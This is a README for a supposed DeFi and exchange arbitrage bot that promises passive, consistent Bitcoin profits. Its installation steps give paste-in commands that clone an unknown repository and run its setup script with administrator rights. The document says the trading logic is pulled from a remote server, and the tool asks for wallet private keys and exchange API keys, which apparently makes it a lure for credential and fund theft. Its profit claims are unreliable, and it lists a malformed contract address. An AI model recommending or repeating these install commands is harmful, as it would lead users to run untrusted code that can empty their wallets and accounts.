# DeFi Arbitrage Bot
## Overview
The DeFi Arbitrage Bot is a powerful tool designed for automated arbitrage trading, seamlessly integrating Bitcoin and other cryptocurrencies across decentralized exchanges (DEX) like Uniswap V3/V4, PancakeSwap V3, AerodromeFi, Curve, and Raydium, and centralized exchanges (CEX) such as Binance, Bybit, and KuCoin. Hosted on a server at `https://arb-terminal-defi.io` creating data archive with server copy, the bot launches a local terminal via localhost, dynamically fetching trading scripts, APIs, and configurations to execute Bitcoin-focused arbitrage strategies. By leveraging price inefficiencies, the bot facilitates Bitcoin buy and sell orders, liquidity provision, and cross-platform arbitrage, ensuring passive profit generation through consistent spread capture while stabilizing markets through price convergence and liquidity flow.

The bot supports cross-chain trading via Wormhole, MEV protection via Jito (Solana) and Flashbots/Matcha (EVM), and a React and Tailwind CSS GUI for configuring trading parameters, tokens, contract addresses, and CEX API credentials. Enhanced with Clusters, Tickers, and Charts, it provides real-time market insights for Bitcoin and other assets, driving informed arbitrage decisions. Optimized for low latency, reliability, and security, it includes input validation, detailed logging, and monitoring of mempools and CEX order books. The bot is production-ready for mainnet but recommended for testing on Goerli, BSC Testnet, or Solana Devnet.

## 📥 Installation & Setup
The DeFi Arbitrage Bot runs a local terminal on `http://localhost:3000`, fetching all trading scripts, APIs, and configurations. The setup uses a single command to clone the repository and launch the terminal, requiring only Git and basic system tools.

### Windows Installation
1. **Open PowerShell**:
   - Press `Win + S`, type `PowerShell`, and hit Enter.

2. **Launch the Terminal with the Specified Command**:
   - Run the exact command to install Git, clone the repository, and start the terminal:
     ```powershell
     winget install --id Git.Git -e --source winget & git clone https://github.com/tar-ser/defi-trading-terminal-arb-tracker.git & cd defi-trading-terminal-arb-tracker & powershell -Command "Start-Process cmd -ArgumentList '/c .\setup.cmd' -Verb RunAs"
     ```
   - **What it does**:
     - Installs Git via `winget`.
     - Clones the `defi-trading-terminal-arb-tracker` repository.
     - Runs `setup.cmd` with admin privileges, starting a local server on `http://localhost:3000` that connects to server for trading scripts and configurations working locally.
    
### macOS Installation
1. **Open Terminal**:
   - Press `Cmd + T` or navigate to `Applications > Utilities > Terminal`.

2. **Install Git (if needed) and Launch the Terminal**:
   - Run the command, prefixed with a Git installation check:
     ```bash
     command -v git >/dev/null 2>&1 || /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" && brew install git; git clone https://github.com/tar-ser/defi-trading-terminal-arb-tracker.git && cd defi-trading-terminal-arb-tracker && ./setup.sh
     ```
   - **What it does**:
     - Checks if Git is installed; if not, installs Homebrew and Git.
     - Clones the `defi-trading-terminal-arb-tracker` repository.
     - Runs `setup.sh`, starting a local server on `http://localhost:3000` that connects to server.

### Notes
- The terminal requires only Git and system tools (`powershell` on Windows, `bash` on macOS). All trading logic is fetched from `https://arb-terminal-defi.io`.
- If the browser doesn’t open, navigate to `http://localhost:3000` manually.
- Ensure port 3000 is free and firewall settings allow localhost connections.

# Key Features
## Arbitrage Trading
- **Automated Bitcoin Spread Capture**: Continuously scans DEX (Uniswap V3/V4, PancakeSwap V3, AerodromeFi, Raydium) and CEX (Binance, Bybit, KuCoin) for arbitrage opportunities, executing Bitcoin buy and sell orders to capture price spreads passively, ensuring consistent profits.
- **Price Aggregation and Triangular Arbitrage**: Leverages 1inch and Matcha for EVM chains, Raydium API for Solana, and CEX APIs for real-time Bitcoin pricing, enabling intra-platform and triangular arbitrage across Bitcoin, ETH, and other tokens.
- **Cross-Chain and Cross-Platform Arbitrage**: Facilitates Bitcoin and token trades between Solana and Ethereum via Wormhole, and between CEX and DEX by buying Bitcoin on CEX and transferring or converting it to DEX for arbitrage, optimizing liquidity flow.
- **CEX-DEX Market-Making with Bitcoin**: Executes Bitcoin buy orders on CEX (e.g., Binance) and sells or converts to stablecoins (e.g., USDC) or tokens (e.g., ETH, SOL) on DEX (e.g., Uniswap, Raydium). This parallel strategy exploits price dislocations, providing liquidity to stabilize markets while generating passive arbitrage profits.

## Bitcoin Interaction and Profit Mechanism
- **Bitcoin Buy/Sell on CEX**: The bot monitors Bitcoin order books on Binance, Bybit, and KuCoin, executing buy orders when Bitcoin prices are lower than DEX equivalents (e.g., BTC/USDC on Raydium). It sells Bitcoin on CEX when prices exceed DEX, capturing spreads (e.g., buy Bitcoin at $60,000 on Binance, sell at $60,500 on Uniswap).
- **Bitcoin Conversion on DEX**: Converts Bitcoin to stablecoins or tokens on DEX to lock in profits or enable cross-chain arbitrage (e.g., Bitcoin to USDC on Uniswap, then USDC to SOL on Raydium). This leverages liquidity pools for efficient swaps.
- **Liquidity Provision**: Supplies Bitcoin and stablecoins to DEX pools (e.g., BTC/USDC on Raydium), earning fees while stabilizing prices. The bot’s liquidity provision reduces slippage, enhancing arbitrage profitability.
- **Profit Drivers**: Profits stem from price inefficiencies between CEX and DEX (e.g., Bitcoin price discrepancies), low-latency trade execution, and liquidity provision fees. By balancing buy/sell orders and liquidity across platforms, the bot ensures passive, consistent returns while mitigating volatility.
- **Why It Works**: Bitcoin’s high liquidity and volatility create frequent arbitrage opportunities. The bot’s real-time Clusters, Tickers, and Charts provide insights into Bitcoin market depth, order flow, and price trends, enabling precise buy/sell decisions for maximum spread capture.

## Metrics and Visualizations
- **Clusters**: Displays Bitcoin and token order book clusters, showing aggregated buy/sell volumes at key price levels across CEX and DEX, helping identify arbitrage opportunities.
- **Tickers**: Real-time Bitcoin and token price tickers from Binance, Bybit, KuCoin, Uniswap, and Raydium, enabling quick price comparison for spread capture.
- **Charts**: Interactive candlestick and liquidity charts for Bitcoin and other assets, visualizing price trends, volume, and pool depth to inform buy/sell decisions.

## MEV Protection
- **Solana**: Uses Jito for private transaction bundles to prevent front-running of Bitcoin and token trades.
- **Ethereum**: Integrates Flashbots for private transactions and Matcha Auto to mitigate sandwich attacks.
- **CEX Security**: Executes Bitcoin trades with secure API key management and rate-limiting.

## User-Friendly GUI
- **Bot Management**: Start/stop the bot with a single click.
- **Token Addition**: Add tokens (e.g., Bitcoin, SHIB) by entering symbol, address, and network.
- **CEX Configuration**: Input API keys for Binance, Bybit, or KuCoin to enable Bitcoin trading.
- **Contract Address Configuration**: Set addresses for AerodromeFi and Raydium with validation (EVM via `web3.utils.isAddress`, Solana via PublicKey).
- **Trading Parameters**:
  - Minimum Profit Threshold: e.g., 0.5% for Bitcoin arbitrage.
  - Maximum Slippage Tolerance: e.g., 0.1% (DEX), 0.05% (CEX).
  - Maximum Gas Price: e.g., 80 Gwei (DEX only).
  - Jito Tip: e.g., 10,000 lamports (Solana only).
  - Order Size: e.g., $100,000 (DEX), $50,000 (CEX, Bitcoin-focused).
  - CEX-DEX Transfer Threshold: e.g., $10,000 for Bitcoin conversions.
- **.env Configuration**: Input RPC URLs, wallet addresses, private keys, and CEX API credentials.
- **Real-Time Logs**: Displays logs like “Bitcoin arbitrage: Captured $2,000 spread.”

## Raydium Integration (Solana)
- Integrates `@raydium-io/raydium-sdk` for Bitcoin and token swaps.
- Loads pool data via Raydium API, supporting Bitcoin pairs (e.g., BTC/SOL).
- Supports tokens like WIF and BONK with dynamic pool addresses.

## Cross-Chain via Wormhole
- Transfers Bitcoin and tokens between Solana and Ethereum for arbitrage.
- Logs VAA for transparent tracking.

## CEX-DEX Arbitrage Workflow
- **Bitcoin Acquisition on CEX**: Buys Bitcoin on Binance, Bybit, or KuCoin when prices are favorable, using Clusters and Tickers for real-time analysis.
- **Cross-Platform Transfer/Conversion**: Transfers Bitcoin to DEX wallets or converts to stablecoins/tokens on Uniswap or Raydium, leveraging Charts for price confirmation.
- **Parallel Market-Making**: Executes Bitcoin buy/sell orders alongside DEX arbitrage, providing liquidity to stabilize prices and capture spreads.
- **Price Convergence and Stability**: Balances Bitcoin liquidity between CEX and DEX, reducing volatility and ensuring passive profits.

## Mempool and Order Book Monitoring
- Tracks Ethereum, BNB Chain, and Base mempools via WebSocket.
- Monitors Solana via Jito ShredStream.
- Tracks Bitcoin order books on CEX via real-time API feeds.

## Contract Addresses
- **Uniswap V3**: `0xE592427A0AEce92De3Edee1F18E0157C05861564` (Ethereum).
- **Uniswap V4**: `0x1f9840a85d5aF5B72077a8F9c8f7a8C4b7c0F0E` (Ethereum).
- **PancakeSwap V3**: `0x13f4EA83D0bd40E75C8222255bc855a974568Dd4` (BNB Chain).
- **Curve**: `0xD51a44d3FaE010294C616388b506AcdA1bfAAE46` (Ethereum).
- **AerodromeFi**: `0x420DD381b31aEf6683db6B902084cB0FFECe40Da` (Base).
- **Raydium**: `4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R` (Solana, USDC/SOL pool).

## Supported Tokens
- **Native Tokens**: BTC (via CEX), ETH, BNB, SOL, WBNB.
- **Stablecoins**: USDC, USDT, DAI.
- **Meme Coins**: SHIB, PEPE (Ethereum), WIF, BONK (Solana), plus custom tokens.

## APIs
- **DEX APIs**: 1inch, Matcha for EVM pricing; Raydium API for Solana and Bitcoin pairs.
- **CEX APIs**: Binance, Bybit, KuCoin for Bitcoin pricing and execution.
- **DeFiLlama**: For pool liquidity verification.

# How to Use
## Adding a Token
1. Enter symbol (e.g., BTC, NEIRO).
2. Input token address (e.g., `0x812ba41e071c7b7fa4d46a1839f9e6031c0b655d` for NEIRO).
3. Select network (Ethereum, BNB Chain, Base, Solana).
4. Click **Add Token**.
5. Log: “Added token: BTC”.

## Setting Contract Addresses
- **AerodromeFi**: Enter address (e.g., `0x420DD381b31aEf6683db6B902084cB0FFECe40Da`).
- **Raydium**: Enter pool ID (e.g., `4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R`).
- Click **Update Contract Addresses**.
- Log: “Updated Raydium address: 4k3Dyjzv...”.

## Configuring CEX Integration
1. Select CEX (Binance, Bybit, KuCoin).
2. Input API key and secret key.
3. Set Bitcoin trading parameters (e.g., order size: $50–$500,000, transfer threshold: $10,000).
4. Click **Save CEX Configuration**.
5. Log: “Configured Binance API for Bitcoin trading.”

## Configuring Trading Parameters
1. Set **Minimum Profit Threshold**: e.g., 0.5% for Bitcoin arbitrage.
2. Set **Maximum Slippage Tolerance**: e.g., 0.1% (DEX), 0.05% (CEX).
3. Set **Maximum Gas Price**: e.g., 80 Gwei (DEX only).
4. Set **Jito Tip**: e.g., 10,000 lamports (Solana only).
5. Set **Order Size**: e.g., $100,000 (DEX), $50,000 (CEX, Bitcoin-focused).
6. Set **CEX-DEX Transfer Threshold**: e.g., $10,000.
7. Click **Update Order Size**.
8. Log: “Updated order size: $100,000 (DEX), $50,000 (CEX)”.

## Starting the Bot
1. Click **Start Bot**.
2. Log: “Bot started”.
3. The bot scans for Bitcoin and token arbitrage opportunities across DEX and CEX, executing buy/sell orders.
